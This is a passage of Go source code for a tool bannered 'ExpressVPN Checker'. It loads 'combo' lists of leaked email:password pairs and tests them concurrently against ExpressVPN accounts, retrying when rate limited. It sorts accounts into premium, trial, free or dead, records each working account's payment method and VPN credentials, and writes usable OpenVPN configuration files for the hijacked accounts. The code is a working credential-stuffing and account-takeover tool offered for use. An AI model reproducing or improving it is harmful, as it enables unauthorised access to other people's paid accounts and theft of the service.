A7jj+eig3bmZ5Iatw1pfqEQT/M1A/H5aUYq4KOPBB8AkRzpHty003CJrYcr+Lsdo
tRTiqYxB9QAqs7u5WZ82XiYOImN3SgrTcJQPHXWtbUmsx6pxCkHelMMgWCfPSkWG
BQCYm/vuOx6Ysea22jH0zuy8GCTYASy7w6ks9JBe
-----END CERTIFICATE-----
`

func ovpnConfig(hostname, email string, info *AccountInfo, serverLabel string) string {
        serverComment := ""
        if serverLabel != "" {
                serverComment = "# Server:  " + serverLabel + "\n"
        }
        return fmt.Sprintf(`client
dev tun
proto udp
remote %s 1195
remote %s 443 tcp
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
setenv CLIENT_CERT 0
auth-nocache
cipher AES-256-CBC
auth SHA512
verb 3
# Account:  %s
# Plan:     %s  |  Expires: %s  |  Auto-Renew: %s
%s<auth-user-pass>
%s
%s
</auth-user-pass>
<ca>
%s
</ca>
`,
                hostname, hostname,
                email, info.Plan, info.ExpireDate, info.AutoRenew,
                serverComment,
                info.OVPNUsername, info.OVPNPassword,
                ovpnCABlock,
        )
}

func saveOVPN(email string, info *AccountInfo) {
        if err := os.MkdirAll("ovpns", 0755); err != nil {
                return
        }
        safe := strings.NewReplacer("/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_").Replace(email)
        path := fmt.Sprintf("ovpns/%s.ovpn", safe)

        hostname := "<server-not-selected>"
        label := ""
        if selectedServer != nil {
                hostname = selectedServer.Hostname
                label = selectedServer.Country
                if selectedServer.City != "" {
                        label += " / " + selectedServer.City
                }
        }

        _ = os.WriteFile(path, []byte(ovpnConfig(hostname, email, info, label)), 0600)
}

func progressBar(done, total int, barWidth int) string {
        if total == 0 {
                return "[" + strings.Repeat("░", barWidth) + "] 0/0"
        }
        filled := done * barWidth / total
        if filled > barWidth {
                filled = barWidth
        }
        pct := done * 100 / total
        bar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
        return fmt.Sprintf("[%s] %d/%d (%d%%)", bar, done, total, pct)
}

func printResult(result string, email, password string, info *AccountInfo) {
        switch result {
        case "premium":
                fmt.Printf("%s%s[PREMIUM]%s %s:%s\n", colorGreen, colorBold, colorReset, email, password)
                if info != nil {
                        fmt.Printf("         Status    : %sPREMIUM / PAID%s\n", colorGreen, colorReset)
                        fmt.Printf("         Plan      : %s\n", info.Plan)
                        fmt.Printf("         Expires   : %s (%d days)\n", info.ExpireDate, info.DaysLeft)
                        fmt.Printf("         Auto-Renew: %s\n", info.AutoRenew)
                        fmt.Printf("         Payment   : %s\n", info.PaymentMethod)
                        fmt.Printf("         OVPN      : %s / %s\n", info.OVPNUsername, info.OVPNPassword)
                }
        case "trial":
                fmt.Printf("%s%s[TRIAL]%s   %s:%s\n", colorPurple, colorBold, colorReset, email, password)
                if info != nil {
                        fmt.Printf("         Status    : %sFREE TRIAL%s\n", colorPurple, colorReset)
                        fmt.Printf("         Plan      : %s\n", info.Plan)
                        fmt.Printf("         Expires   : %s (%d days)\n", info.ExpireDate, info.DaysLeft)
                        fmt.Printf("         Auto-Renew: %s\n", info.AutoRenew)
                        fmt.Printf("         OVPN      : %s / %s\n", info.OVPNUsername, info.OVPNPassword)
                }
        case "free":
                fmt.Printf("%s[FREE]%s    %s:%s\n", colorYellow, colorReset, email, password)
        case "rate_limited":
                fmt.Printf("%s[RATELIMIT]%s %s:%s\n", colorCyan, colorReset, email, password)
        default:
                fmt.Printf("%s[DEAD]%s    %s:%s\n", colorRed, colorReset, email, password)
        }
}

// ─── server browser ───────────────────────────────────────────────────────────

func uniqueCountries() []string {
        seen := map[string]bool{}
        var out []string
        for _, s := range servers {
                if !seen[s.Country] {
                        seen[s.Country] = true
                        out = append(out, s.Country)
                }
        }
        sort.Strings(out)
        return out
}

func serversForCountry(country string) []Server {
        var out []Server
        for _, s := range servers {
                if s.Country == country {
                        out = append(out, s)
                }
        }
        return out
}

func browseServers(r *bufio.Reader) {
        countries := uniqueCountries()

        for {
                fmt.Printf("\n%s%s  Server Browser  (%d countries / %d servers)%s\n",
                        colorBold, colorCyan, len(countries), len(servers), colorReset)
                fmt.Printf("%s  Type a number, country name, or [q] to go back%s\n\n", colorDim, colorReset)

                colW := 28
                cols := 3
                for i, c := range countries {
                        idx := fmt.Sprintf("%3d.", i+1)
                        entry := fmt.Sprintf("%s %-*s", idx, colW, c)
                        fmt.Printf("%s%s%s", colorDim, entry, colorReset)
                        if (i+1)%cols == 0 {
                                fmt.Println()
                        }
                }
                if len(countries)%cols != 0 {
                        fmt.Println()
                }

                fmt.Printf("\n%sCountry: %s", colorDim, colorReset)
                line, _ := r.ReadString('\n')
                line = strings.TrimSpace(line)

                if strings.ToLower(line) == "q" || line == "" {
                        return
                }

                // try numeric
                var country string
                if n, err := strconv.Atoi(line); err == nil {
                        if n >= 1 && n <= len(countries) {
                                country = countries[n-1]
                        } else {
                                fmt.Printf("%sInvalid number.%s\n", colorRed, colorReset)
                                continue
                        }
                } else {
                        // fuzzy name match
                        lower := strings.ToLower(line)
                        var matches []string
                        for _, c := range countries {
                                if strings.HasPrefix(strings.ToLower(c), lower) {
                                        matches = append(matches, c)
                                }
                        }
                        if len(matches) == 0 {
                                for _, c := range countries {
                                        if strings.Contains(strings.ToLower(c), lower) {
                                                matches = append(matches, c)
                                        }
                                }
                        }
                        if len(matches) == 0 {
                                fmt.Printf("%sNo matching country.%s\n", colorRed, colorReset)
                                continue
                        }
                        if len(matches) == 1 {
                                country = matches[0]
                        } else {
                                fmt.Printf("%sMultiple matches:%s\n", colorYellow, colorReset)
                                for i, m := range matches {
                                        fmt.Printf("  %d. %s\n", i+1, m)
                                }
                                fmt.Printf("%sChoose: %s", colorDim, colorReset)
                                pick, _ := r.ReadString('\n')
                                p, err := strconv.Atoi(strings.TrimSpace(pick))
                                if err != nil || p < 1 || p > len(matches) {
                                        continue
                                }
                                country = matches[p-1]
                        }
                }

                srvs := serversForCountry(country)
                if len(srvs) == 0 {
                        fmt.Printf("%sNo servers for %s.%s\n", colorRed, country, colorReset)
                        continue
                }

                fmt.Printf("\n%s%s  %s — %d server(s)%s\n\n", colorBold, colorCyan, country, len(srvs), colorReset)
                for i, s := range srvs {
                        city := s.City
                        if city == "" {
                                city = country
                        }
                        proto := ""
                        if s.UDP {
                                proto += "UDP"
                        }
                        if s.TCP {
                                if proto != "" {
                                        proto += "/"
                                }
                                proto += "TCP"
                        }
                        fmt.Printf("  %s%2d.%s %-22s  %s%s%s\n",
                                colorCyan, i+1, colorReset,
                                city,
                                colorDim, s.Hostname, colorReset,
                        )
                        _ = proto
                }

                fmt.Printf("\n%sSelect server (number, or [b] back): %s", colorDim, colorReset)
                pick, _ := r.ReadString('\n')
                pick = strings.TrimSpace(pick)
                if strings.ToLower(pick) == "b" || pick == "" {
                        continue
                }
                p, err := strconv.Atoi(pick)
                if err != nil || p < 1 || p > len(srvs) {
                        fmt.Printf("%sInvalid selection.%s\n", colorRed, colorReset)
                        continue
                }
                chosen := srvs[p-1]
                selectedServer = &chosen
                loc := chosen.Country
                if chosen.City != "" {
                        loc += " / " + chosen.City
                }
                fmt.Printf("\n%s%s✔  Selected: %s%s\n   Hostname: %s%s\n",
                        colorGreen, colorBold, loc, colorReset,
                        colorDim, chosen.Hostname+colorReset,
                )
                updated := patchOVPNFiles(chosen.Hostname, loc)
                if updated > 0 {
                        fmt.Printf("   %s↳ Updated %d existing OVPN file(s) in ovpns/%s\n",
                                colorDim, updated, colorReset)
                }
                return
        }
}

// patchOVPNFiles rewrites ALL remote lines and the server comment in every
// .ovpn file in the ovpns/ directory to match the newly selected server.
// It handles the two-remote template (UDP 1195 + TCP 443).
func patchOVPNFiles(hostname, location string) int {
        entries, err := os.ReadDir("ovpns")
        if err != nil {
                return 0
        }
        updated := 0
        for _, e := range entries {
                if e.IsDir() || !strings.HasSuffix(e.Name(), ".ovpn") {
                        continue
                }
                path := "ovpns/" + e.Name()
                raw, err := os.ReadFile(path)
                if err != nil {
                        continue
                }
                lines := strings.Split(string(raw), "\n")
                changed := false
                for i, line := range lines {
                        if strings.HasPrefix(line, "remote ") {
                                parts := strings.Fields(line)
                                if len(parts) >= 4 && parts[3] == "tcp" {
                                        lines[i] = "remote " + hostname + " 443 tcp"
                                } else {
                                        lines[i] = "remote " + hostname + " 1195"
                                }
                                changed = true
                        }
                        if strings.HasPrefix(line, "# Server:") {
                                lines[i] = "# Server:  " + location
                                changed = true
                        }
                }
                if changed {
                        _ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0600)
                        updated++
                }
        }
        return updated
}

// ─── CLI actions ──────────────────────────────────────────────────────────────

func promptLine(r *bufio.Reader, label string) string {
        fmt.Printf("%s%s%s ", colorDim, label, colorReset)
        s, _ := r.ReadString('\n')
        return strings.TrimSpace(s)
}

func doSingleCheck(r *bufio.Reader) {
        email := promptLine(r, "Email   :")
        pass := promptLine(r, "Password:")
        fmt.Printf("\n%sChecking...%s\n\n", colorCyan, colorReset)

        result, info := checkExpressVPN(email, pass)
        printResult(result, email, pass, info)
        if (result == "premium" || result == "trial") && info != nil {
                saveHit(email, pass, info)
                saveOVPN(email, info)
                fmt.Printf("         Config    : %sovpns/%s.ovpn%s\n",
                        colorDim, email, colorReset)
        }
}

func doFileCheck(r *bufio.Reader) {
        filePath := promptLine(r, "Combo file:")
        f, err := os.Open(filePath)
        if err != nil {
                fmt.Printf("%sError opening file: %v%s\n", colorRed, err, colorReset)
                return
        }
        defer f.Close()

        var combos []string
        sc := bufio.NewScanner(f)
        for sc.Scan() {
                line := strings.TrimSpace(sc.Text())
                if line != "" && strings.Contains(line, ":") {
                        combos = append(combos, line)
                }
        }
        if len(combos) == 0 {
                fmt.Printf("%sNo combos found in file.%s\n", colorRed, colorReset)
                return
        }

        workersStr := promptLine(r, "Workers (1-20):")
        workers := 3
        fmt.Sscanf(workersStr, "%d", &workers)
        if workers < 1 {
                workers = 1
        }
        if workers > 20 {
                workers = 20
        }

        total := len(combos)
        srv := serverLabel()
        fmt.Printf("\n%sLoaded %d combos | Workers: %d | Server: %s%s\n\n",
                colorCyan, total, workers, srv, colorReset)

        type hitEntry struct {
                result string
                email  string
                pass   string
                info   *AccountInfo
        }

        var (
                done    int64
                premium int64
                trial   int64
                free    int64
                failed  int64
                retries int64
        )

        var hitsMu sync.Mutex
        var hits []hitEntry

        sem := make(chan struct{}, workers)
        var wg sync.WaitGroup
        var printMu sync.Mutex

        printStatus := func() {
                printMu.Lock()
                d := int(atomic.LoadInt64(&done))
                bar := progressBar(d, total, 20)
                fmt.Printf("\r%s%s%s  %sPremium %d%s | %sTrial %d%s | %sFree %d%s | %sDead %d%s | Retry %d   ",
                        colorCyan, bar, colorReset,
                        colorGreen, atomic.LoadInt64(&premium), colorReset,
                        colorPurple, atomic.LoadInt64(&trial), colorReset,
                        colorYellow, atomic.LoadInt64(&free), colorReset,
                        colorRed, atomic.LoadInt64(&failed), colorReset,
                        atomic.LoadInt64(&retries),
                )
                printMu.Unlock()
        }

        for _, combo := range combos {
                sem <- struct{}{}
                wg.Add(1)

                go func(c string) {
                        defer func() { <-sem; wg.Done() }()

                        parts := strings.SplitN(c, ":", 2)
                        if len(parts) != 2 {
                                atomic.AddInt64(&failed, 1)
                                atomic.AddInt64(&done, 1)
                                printStatus()
                                return
                        }
                        email, pass := parts[0], parts[1]

                        var result string
                        var info *AccountInfo
                        for attempts := 0; attempts < 50; attempts++ {
                                result, info = checkExpressVPN(email, pass)
                                if result != "rate_limited" {
                                        break
                                }
                                atomic.AddInt64(&retries, 1)
                                printStatus()
                                time.Sleep(500 * time.Millisecond)
                        }

                        atomic.AddInt64(&done, 1)
                        switch result {
                        case "premium", "trial":
                                if result == "premium" {
                                        atomic.AddInt64(&premium, 1)
                                } else {
                                        atomic.AddInt64(&trial, 1)
                                }
                                if info != nil {
                                        saveHit(email, pass, info)
                                        saveOVPN(email, info)
                                        hitsMu.Lock()
                                        hits = append(hits, hitEntry{result, email, pass, info})
                                        hitsMu.Unlock()
                                }
                        case "free":
                                atomic.AddInt64(&free, 1)
                        default:
                                atomic.AddInt64(&failed, 1)
                        }
                        printStatus()
                }(combo)
        }

        wg.Wait()
        p := atomic.LoadInt64(&premium)
        tr := atomic.LoadInt64(&trial)
        fr := atomic.LoadInt64(&free)
        fa := atomic.LoadInt64(&failed)
        re := atomic.LoadInt64(&retries)
        fmt.Printf("\n\n%s%s  Results%s\n", colorBold, colorCyan, colorReset)
        fmt.Printf("  %s─────────────────────────────%s\n", colorDim, colorReset)
        fmt.Printf("  %sPremium%s  : %s%d%s\n", colorBold, colorReset, colorGreen, p, colorReset)
        fmt.Printf("  %sTrial%s    : %s%d%s\n", colorBold, colorReset, colorPurple, tr, colorReset)
        fmt.Printf("  Free     : %s%d%s\n", colorYellow, fr, colorReset)
        fmt.Printf("  Dead     : %s%d%s\n", colorRed, fa, colorReset)
        fmt.Printf("  Retries  : %d\n", re)
        fmt.Printf("  Total    : %d\n", total)
        fmt.Printf("  %s─────────────────────────────%s\n", colorDim, colorReset)
        if p+tr > 0 {
                fmt.Printf("  %s✔ Hits saved → ExpressVpnHits.txt | ovpns/%s\n", colorGreen, colorReset)
        }
        fmt.Println()

        if len(hits) > 0 {
                fmt.Printf("%s%s  Found Accounts%s\n", colorBold, colorCyan, colorReset)
                fmt.Printf("  %s─────────────────────────────%s\n", colorDim, colorReset)
                for _, h := range hits {
                        printResult(h.result, h.email, h.pass, h.info)
                        if h.info != nil {
                                fmt.Printf("         Config    : %sovpns/%s.ovpn%s\n",
                                        colorDim, h.email, colorReset)
                        }
                        fmt.Println()
                }
        }
}

// ─── main ─────────────────────────────────────────────────────────────────────

func banner() {
        fmt.Printf("%s%s", colorCyan, colorBold)
        fmt.Println("  ╔══════════════════════════════════════════════════╗")
        fmt.Println("  ║   ExpressVPN Checker                             ║")
        fmt.Printf("  ║   %s%s%-44s%s%s║\n", colorReset, colorPurple, "krainium", colorCyan, colorBold)
        fmt.Println("  ╚══════════════════════════════════════════════════╝")
        fmt.Printf("%s\n", colorReset)
}

func printMenu() {
        srv := serverLabel()
        fmt.Printf("  %s[1]%s  Single Check\n", colorCyan, colorReset)
        fmt.Printf("  %s[2]%s  File Check\n", colorCyan, colorReset)
        if selectedServer == nil {
                fmt.Printf("  %s[3]%s  Browse Servers     %s(none selected)%s\n", colorCyan, colorReset, colorDim, colorReset)
        } else {
                fmt.Printf("  %s[3]%s  Browse Servers     %s→ %s%s\n", colorCyan, colorReset, colorGreen, srv, colorReset)
        }
        fmt.Printf("  %s[4]%s  Exit\n\n", colorCyan, colorReset)
}

func main() {
        banner()
        r := bufio.NewReader(os.Stdin)

        for {
                printMenu()
                choice := promptLine(r, "Choice:")
                fmt.Println()

                switch choice {
                case "1":
                        doSingleCheck(r)
                case "2":
                        doFileCheck(r)
                case "3":
                        browseServers(r)
                case "4":
                        fmt.Printf("%sGoodbye.%s\n", colorCyan, colorReset)
                        return
                default:
                        fmt.Printf("%sInvalid choice.%s\n", colorRed, colorReset)
                }
                fmt.Println()
        }
}
